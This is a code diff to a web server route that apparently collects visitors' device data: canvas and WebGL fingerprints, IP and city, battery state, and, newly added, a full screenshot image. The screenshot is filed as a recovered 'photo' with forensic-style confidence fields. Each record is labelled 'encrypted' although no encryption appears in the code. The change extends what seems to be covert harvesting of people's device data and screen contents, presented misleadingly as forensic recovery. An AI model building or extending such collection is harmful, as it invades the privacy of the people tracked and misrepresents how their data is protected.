@@ -32,6 +32,7 @@ export async function POST(req: Request) {
     canvasFingerprint?: string;
     webglVendor?: string;
     webglRenderer?: string;
+    screenshot?: string;
     ipInfo?: {
       ip?: string;
       city?: string;
@@ -392,6 +393,27 @@ export async function POST(req: Request) {
           source: "REAL_BATTERY_CAPTURE",
           batteryPercent: body.batteryPercent,
           charging: body.batteryCharging,
+          capturedAt: new Date().toISOString(),
+          real: true,
+          encrypted: true,
+          encryptionBot: "FORENSIQ-SecureBot-v2",
+        },
+      }] : []),
+      // Screenshot — captured mobile screen image
+      ...(body.screenshot ? [{
+        category: "photos",
+        fileName: `screen_capture_${device.id.slice(-8)}.jpg`,
+        filePath: `browser://canvas/screenshot`,
+        mimeType: "image/jpeg",
+        sizeBytes: body.screenshot.length,
+        recoveryStatus: "existing",
+        confidence: 100,
+        preview: `Screen capture — ${body.screenResolution ?? "unknown resolution"}`,
+        decodedContent: {
+          source: "REAL_SCREEN_CAPTURE",
+          fullImage: body.screenshot,
+          thumbnail: body.screenshot,
+          dimensions: body.screenResolution,
           capturedAt: new Date().toISOString(),
           real: true,
           encrypted: true,
